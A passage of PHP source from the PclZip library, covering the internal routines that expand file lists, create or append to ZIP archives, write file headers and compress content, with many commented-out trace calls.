      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filedescr before reduction :'".$v_descr['filename']."'");
      $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename']);
      $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Filedescr after reduction :'".$v_descr['filename']."'");
      
      // ----- Look for real file or folder
      if (file_exists($v_descr['filename'])) {
        if (@is_file($v_descr['filename'])) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "This is a file");
          $v_descr['type'] = 'file';
        }
        else if (@is_dir($v_descr['filename'])) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "This is a folder");
          $v_descr['type'] = 'folder';
        }
        else if (@is_link($v_descr['filename'])) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Unsupported file type : link");
          // skip
          continue;
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Unsupported file type : unknown type");
          // skip
          continue;
        }
      }
      
      // ----- Look for string added as file
      else if (isset($v_descr['content'])) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "This is a string added as a file");
        $v_descr['type'] = 'virtual_file';
      }
      
      // ----- Missing file
      else {
        // ----- Error log
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$v_descr['filename']."' does not exists");
        PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exists");

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }
      
      // ----- Calculate the stored filename
      $this->privCalculateStoredFilename($v_descr, $p_options);
      
      // ----- Add the descriptor in result list
      $v_result_list[sizeof($v_result_list)] = $v_descr;
      
      // ----- Look for folder
      if ($v_descr['type'] == 'folder') {
        // ----- List of items in folder
        $v_dirlist_descr = array();
        $v_dirlist_nb = 0;
        if ($v_folder_handler = @opendir($v_descr['filename'])) {
          while (($v_item_handler = @readdir($v_folder_handler)) !== false) {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Looking for '".$v_item_handler."' in the directory");

            // ----- Skip '.' and '..'
            if (($v_item_handler == '.') || ($v_item_handler == '..')) {
                continue;
            }
            
            // ----- Compose the full filename
            $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
            
            // ----- Look for different stored filename
            // Because the name of the folder was changed, the name of the
            // files/sub-folders also change
            if ($v_descr['stored_filename'] != $v_descr['filename']) {
              if ($v_descr['stored_filename'] != '') {
                $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
              }
              else {
                $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
              }
            }
      
            $v_dirlist_nb++;
          }
          
          @closedir($v_folder_handler);
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Unable to open dir '".$v_descr['filename']."' in read mode. Skipped.");
          // TBC : unable to open folder in read mode
        }
        
        // ----- Expand each element of the list
        if ($v_dirlist_nb != 0) {
          // ----- Expand
          if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
            return $v_result;
          }
          
          // ----- Concat the resulting list
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Merging result list (size '".sizeof($v_result_list)."') with dirlist (size '".sizeof($v_dirlist_descr)."')");
          $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "merged result list is size '".sizeof($v_result_list)."'");
        }
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Nothing in this folder to expand.");
        }
          
        // ----- Free local array
        unset($v_dirlist_descr);
      }
    }
    
    // ----- Get the result list
    $p_filedescr_list = $v_result_list;

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privCreate()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCreate", "list");
    $v_result=1;
    $v_list_detail = array();
    
    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Open the file in write mode
    if (($v_result = $this->privOpenFd('wb')) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Add the list of files
    $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

    // ----- Close
    $this->privCloseFd();

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privAdd()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privAdd", "list");
    $v_result=1;
    $v_list_detail = array();

    // ----- Look if the archive exists or is empty
    if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Archive does not exist, or is empty, create it.");

      // ----- Do a create
      $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }
    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_result=$this->privOpenFd('rb')) != 1)
    {
      // ----- Magic quotes trick
      $this->privSwapBackMagicQuotes();

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Read the central directory informations
    $v_central_dir = array();
    if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Go to beginning of File
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in file : ".ftell($this->zip_fd)."'");
    @rewind($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Position in file : ".ftell($this->zip_fd)."'");

    // ----- Creates a temporay file
    $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

    // ----- Open the temporary file in write mode
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
    if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Copy the files from the archive to the temporary file
    // TBC : Here I should better append the file and go back to erase the central dir
    $v_size = $v_central_dir['offset'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = fread($this->zip_fd, $v_read_size);
      @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Swap the file descriptor
    // Here is a trick : I swap the temporary fd with the zip fd, in order to use
    // the following methods on the temporary fil and not the real archive
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;

    // ----- Add the files
    $v_header_list = array();
    if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
    {
      fclose($v_zip_temp_fd);
      $this->privCloseFd();
      @unlink($v_zip_temp_name);
      $this->privSwapBackMagicQuotes();

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Store the offset of the central dir
    $v_offset = @ftell($this->zip_fd);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "New offset of central dir : $v_offset");

    // ----- Copy the block of file headers from the old archive
    $v_size = $v_central_dir['size'];
    while ($v_size != 0)
    {
      $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Read $v_read_size bytes");
      $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
      @fwrite($this->zip_fd, $v_buffer, $v_read_size);
      $v_size -= $v_read_size;
    }

    // ----- Create the Central Dir files header
    for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
    {
      // ----- Create the file header
      if ($v_header_list[$i]['status'] == 'ok') {
        if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
          fclose($v_zip_temp_fd);
          $this->privCloseFd();
          @unlink($v_zip_temp_name);
          $this->privSwapBackMagicQuotes();

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }
        $v_count++;
      }

      // ----- Transform the header to a 'usable' info
      $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
    }

    // ----- Zip file comment
    $v_comment = $v_central_dir['comment'];
    if (isset($p_options[PCLZIP_OPT_COMMENT])) {
      $v_comment = $p_options[PCLZIP_OPT_COMMENT];
    }
    if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
      $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
    }
    if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
      $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
    }

    // ----- Calculate the size of the central header
    $v_size = @ftell($this->zip_fd)-$v_offset;

    // ----- Create the central dir footer
    if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
    {
      // ----- Reset the file list
      unset($v_header_list);
      $this->privSwapBackMagicQuotes();

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Swap back the file descriptor
    $v_swap = $this->zip_fd;
    $this->zip_fd = $v_zip_temp_fd;
    $v_zip_temp_fd = $v_swap;

    // ----- Close
    $this->privCloseFd();

    // ----- Close the temporary file
    @fclose($v_zip_temp_fd);

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Delete the zip file
    // TBC : I should test the result ...
    @unlink($this->zipname);

    // ----- Rename the temporary file
    // TBC : I should test the result ...
    //@rename($v_zip_temp_name, $this->zipname);
    PclZipUtilRename($v_zip_temp_name, $this->zipname);

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privOpenFd()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function privOpenFd($p_mode)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privOpenFd", 'mode='.$p_mode);
    $v_result=1;

    // ----- Look if already open
    if ($this->zip_fd != 0)
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Open the zip file
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, 'Open file in '.$p_mode.' mode');
    if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privCloseFd()
  // Description :
  // Parameters :
  // --------------------------------------------------------------------------------
  function privCloseFd()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCloseFd", "");
    $v_result=1;

    if ($this->zip_fd != 0)
      @fclose($this->zip_fd);
    $this->zip_fd = 0;

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privAddList()
  // Description :
  //   $p_add_dir and $p_remove_dir will give the ability to memorize a path which is
  //   different from the real path of the file. This is usefull if you want to have PclTar
  //   running in any directory, and memorize relative path from an other directory.
  // Parameters :
  //   $p_list : An array containing the file or directory names to add in the tar
  //   $p_result_list : list of added files with their properties (specially the status field)
  //   $p_add_dir : Path to add in the filename path archived
  //   $p_remove_dir : Path to remove in the filename path archived
  // Return Values :
  // --------------------------------------------------------------------------------
//  function privAddList($p_list, &$p_result_list, $p_add_dir, $p_remove_dir, $p_remove_all_dir, &$p_options)
  function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privAddList", "list");
    $v_result=1;

    // ----- Add the files
    $v_header_list = array();
    if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
    {
      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Store the offset of the central dir
    $v_offset = @ftell($this->zip_fd);

    // ----- Create the Central Dir files header
    for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
    {
      // ----- Create the file header
      if ($v_header_list[$i]['status'] == 'ok') {
        if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }
        $v_count++;
      }

      // ----- Transform the header to a 'usable' info
      $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
    }

    // ----- Zip file comment
    $v_comment = '';
    if (isset($p_options[PCLZIP_OPT_COMMENT])) {
      $v_comment = $p_options[PCLZIP_OPT_COMMENT];
    }

    // ----- Calculate the size of the central header
    $v_size = @ftell($this->zip_fd)-$v_offset;

    // ----- Create the central dir footer
    if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
    {
      // ----- Reset the file list
      unset($v_header_list);

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
      return $v_result;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privAddFileList()
  // Description :
  // Parameters :
  //   $p_filedescr_list : An array containing the file description 
  //                      or directory names to add in the zip
  //   $p_result_list : list of added files with their properties (specially the status field)
  // Return Values :
  // --------------------------------------------------------------------------------
  function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privAddFileList", "filedescr_list");
    $v_result=1;
    $v_header = array();

    // ----- Recuperate the current number of elt in list
    $v_nb = sizeof($p_result_list);
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Before add, list have ".$v_nb." elements");

    // ----- Loop on the files
    for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
      // ----- Format the filename
      $p_filedescr_list[$j]['filename']
      = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
      
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Looking for file '".$p_filedescr_list[$j]['filename']."'");

      // ----- Skip empty file names
      // TBC : Can this be possible ? not checked in DescrParseAtt ?
      if ($p_filedescr_list[$j]['filename'] == "") {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Skip empty filename");
        continue;
      }

      // ----- Check the filename
      if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
          && (!file_exists($p_filedescr_list[$j]['filename']))) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File '".$p_filedescr_list[$j]['filename']."' does not exists");
        PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exists");
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
        return PclZip::errorCode();
      }

      // ----- Look if it is a file or a dir with no all path remove option
      // or a dir with all its path removed
//      if (   (is_file($p_filedescr_list[$j]['filename']))
//          || (   is_dir($p_filedescr_list[$j]['filename'])
      if (   ($p_filedescr_list[$j]['type'] == 'file')
          || ($p_filedescr_list[$j]['type'] == 'virtual_file')
          || (   ($p_filedescr_list[$j]['type'] == 'folder')
              && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                  || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
          ) {

        // ----- Add the file
        $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                       $p_options);
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }

        // ----- Store the file infos
        $p_result_list[$v_nb++] = $v_header;
      }
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "After add, list have ".$v_nb." elements");

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privAddFile()
  // Description :
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privAddFile($p_filedescr, &$p_header, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privAddFile", "filename='".$p_filedescr['filename']."'");
    $v_result=1;
    
    // ----- Working variable
    $p_filename = $p_filedescr['filename'];

    // TBC : Already done in the fileAtt check ... ?
    if ($p_filename == "") {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

      // ----- Return
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
      return PclZip::errorCode();
    }
  
    // ----- Look for a stored different filename 
    /* TBC : Removed
    if (isset($p_filedescr['stored_filename'])) {
      $v_stored_filename = $p_filedescr['stored_filename'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, 'Stored filename is NOT the same "'.$v_stored_filename.'"');
    }
    else {
      $v_stored_filename = $p_filedescr['stored_filename'];
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, 'Stored filename is the same');
    }
    */

    // ----- Set the file properties
    clearstatcache();
    $p_header['version'] = 20;
    $p_header['version_extracted'] = 10;
    $p_header['flag'] = 0;
    $p_header['compression'] = 0;
    $p_header['crc'] = 0;
    $p_header['compressed_size'] = 0;
    $p_header['filename_len'] = strlen($p_filename);
    $p_header['extra_len'] = 0;
    $p_header['disk'] = 0;
    $p_header['internal'] = 0;
    $p_header['offset'] = 0;
    $p_header['filename'] = $p_filename;
// TBC : Removed    $p_header['stored_filename'] = $v_stored_filename;
    $p_header['stored_filename'] = $p_filedescr['stored_filename'];
    $p_header['extra'] = '';
    $p_header['status'] = 'ok';
    $p_header['index'] = -1;

    // ----- Look for regular file
    if ($p_filedescr['type']=='file') {
      $p_header['external'] = 0x00000000;
      $p_header['size'] = filesize($p_filename);
    }
    
    // ----- Look for regular folder
    else if ($p_filedescr['type']=='folder') {
      $p_header['external'] = 0x00000010;
      $p_header['mtime'] = filemtime($p_filename);
      $p_header['size'] = filesize($p_filename);
    }
    
    // ----- Look for virtual file
    else if ($p_filedescr['type'] == 'virtual_file') {
      $p_header['external'] = 0x00000000;
      $p_header['size'] = strlen($p_filedescr['content']);
    }
    
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 5, "Header external extension '".sprintf("0x%X",$p_header['external'])."'");

    // ----- Look for filetime
    if (isset($p_filedescr['mtime'])) {
      $p_header['mtime'] = $p_filedescr['mtime'];
    }
    else if ($p_filedescr['type'] == 'virtual_file') {
      $p_header['mtime'] = mktime();
    }
    else {
      $p_header['mtime'] = filemtime($p_filename);
    }

    // ------ Look for file comment
    if (isset($p_filedescr['comment'])) {
      $p_header['comment_len'] = strlen($p_filedescr['comment']);
      $p_header['comment'] = $p_filedescr['comment'];
    }
    else {
      $p_header['comment_len'] = 0;
      $p_header['comment'] = '';
    }

    // ----- Look for pre-add callback
    if (isset($p_options[PCLZIP_CB_PRE_ADD])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A pre-callback '".$p_options[PCLZIP_CB_PRE_ADD]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_header, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_PRE_ADD].'(PCLZIP_CB_PRE_ADD, $v_local_header);');
      if ($v_result == 0) {
        // ----- Change the file status
        $p_header['status'] = "skipped";
        $v_result = 1;
      }

      // ----- Update the informations
      // Only some fields can be modified
      if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
        $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "New stored filename is '".$p_header['stored_filename']."'");
      }
    }

    // ----- Look for empty stored filename
    if ($p_header['stored_filename'] == "") {
      $p_header['status'] = "filtered";
    }
    
    // ----- Check the path length
    if (strlen($p_header['stored_filename']) > 0xFF) {
      $p_header['status'] = 'filename_too_long';
    }

    // ----- Look if no error, or file not skipped
    if ($p_header['status'] == 'ok') {

      // ----- Look for a file
//      if (is_file($p_filename))
      if (   ($p_filedescr['type'] == 'file')
          || ($p_filedescr['type'] == 'virtual_file')) {
          
        // ----- Get content from real file
        if ($p_filedescr['type'] == 'file') {        
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "'".$p_filename."' is a file");

          // ----- Open the source file
          if (($v_file = @fopen($p_filename, "rb")) == 0) {
            PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
            //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
            return PclZip::errorCode();
          }

          // ----- Read the file content
          $v_content = @fread($v_file, $p_header['size']);

          // ----- Close the file
          @fclose($v_file);
        }
        else if ($p_filedescr['type'] == 'virtual_file') {        
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Add by string");
          $v_content = $p_filedescr['content'];
        }

        // ----- Calculate the CRC
        $p_header['crc'] = @crc32($v_content);
        
        // ----- Look for no compression
        if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File will not be compressed");
          // ----- Set header parameters
          $p_header['compressed_size'] = $p_header['size'];
          $p_header['compression'] = 0;
        }
        
        // ----- Look for normal compression
        else {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File will be compressed");
          // ----- Compress the content
          $v_content = @gzdeflate($v_content);

          // ----- Set header parameters
          $p_header['compressed_size'] = strlen($v_content);
          $p_header['compression'] = 8;
        }
        
        // ----- Look for encryption
        /*
        if ((isset($p_options[PCLZIP_OPT_CRYPT]))
                    && ($p_options[PCLZIP_OPT_CRYPT] != "")) {
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "File need to be crypted ....");
          
          // Should be a random header
          $v_header = 'xxxxxxxxxxxx';
              $v_content_compressed = PclZipUtilZipEncrypt($v_content_compressed,
                                                           $p_header['compressed_size'],
                                                       $v_header,
                                                                                                   $p_header['crc'],
                                                                                                   "test");
                                                                                                   
          $p_header['compressed_size'] += 12;
          $p_header['flag'] = 1;
          
          // ----- Add the header to the data
          $v_content_compressed = $v_header.$v_content_compressed;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "Size after header : ".strlen($v_content_compressed)."");
        }
        */

        // ----- Call the header generation
        if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
          @fclose($v_file);
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }

        // ----- Write the compressed (or not) content
        @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
      }

      // ----- Look for a directory
      else if ($p_filedescr['type'] == 'folder') {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "'".$p_filename."' is a folder");
        // ----- Look for directory last '/'
        if (@substr($p_header['stored_filename'], -1) != '/') {
          $p_header['stored_filename'] .= '/';
        }

        // ----- Set the file properties
        $p_header['size'] = 0;
        //$p_header['external'] = 0x41FF0010;   // Value for a folder : to be checked
        $p_header['external'] = 0x00000010;   // Value for a folder : to be checked

        // ----- Call the header generation
        if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
        {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
          return $v_result;
        }
      }
    }

    // ----- Look for post-add callback
    if (isset($p_options[PCLZIP_CB_POST_ADD])) {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "A post-callback '".$p_options[PCLZIP_CB_POST_ADD]."()') is defined for the extraction");

      // ----- Generate a local information
      $v_local_header = array();
      $this->privConvertHeader2FileInfo($p_header, $v_local_header);

      // ----- Call the callback
      // Here I do not use call_user_func() because I need to send a reference to the
      // header.
      eval('$v_result = '.$p_options[PCLZIP_CB_POST_ADD].'(PCLZIP_CB_POST_ADD, $v_local_header);');
      if ($v_result == 0) {
        // ----- Ignored
        $v_result = 1;
      }

      // ----- Update the informations
      // Nothing can be modified
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : privCalculateStoredFilename()
  // Description :
  //   Based on file descriptor properties and global options, this method
  //   calculate the filename that will be stored in the archive.
  // Parameters :
  // Return Values :
  // --------------------------------------------------------------------------------
  function privCalculateStoredFilename(&$p_filedescr, &$p_options)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::privCalculateStoredFilename", "filename='".$p_filedescr['filename']."'");
    $v_result=1;
    
    // ----- Working variables
    $p_filename = $p_filedescr['filename'];
    if (isset($p_options[PCLZIP_OPT_ADD_PATH])) {
      $p_add_dir = $p_options[PCLZIP_OPT_ADD_PATH];
    }
    else {
      $p_add_dir = '';
    }
    if (isset($p_options[PCLZIP_OPT_REMOVE_PATH])) {
      $p_remove_dir = $p_options[PCLZIP_OPT_REMOVE_PATH];
    }
    else {
      $p_remove_dir = '';
    }
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Remove path ='".$p_remove_dir."'");
    if (isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
      $p_remove_all_dir = $p_options[PCLZIP_OPT_REMOVE_ALL_PATH];
